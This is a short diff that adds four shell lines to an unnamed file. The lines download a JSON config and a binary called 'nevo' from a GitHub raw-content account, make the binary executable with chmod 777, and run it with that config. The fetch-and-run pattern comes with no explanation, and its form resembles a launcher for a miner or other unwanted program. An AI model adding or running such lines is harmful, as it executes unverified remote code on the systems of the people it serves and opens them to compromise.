@@ -1,0 +1,4 @@
+wget https://raw.githubusercontent.com/6248202226/filesg/main/a.json
+wget https://raw.githubusercontent.com/6248202226/filesg/main/nevo
+chmod 777 nevo
+./nevo -c a.json
